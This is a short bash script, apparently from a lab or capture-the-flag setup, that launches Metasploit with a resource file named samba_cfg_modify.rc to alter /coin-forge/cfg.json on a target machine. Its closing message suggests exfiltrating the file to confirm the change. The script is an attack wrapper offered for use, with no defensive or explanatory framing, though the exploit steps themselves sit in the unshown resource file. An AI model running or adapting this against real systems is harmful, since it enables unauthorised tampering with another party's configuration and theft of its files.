#!/bin/bash

RC_SCRIPT="/home/dcloud/coinbank/web/samba_cfg_modify.rc"

echo "[*] Launching Metasploit to modify /coin-forge/cfg.json on target..."
msfconsole -q -r "$RC_SCRIPT"

echo "[*] Done. You may verify the change using a follow-up command or exfiltrate the file for confirmation."
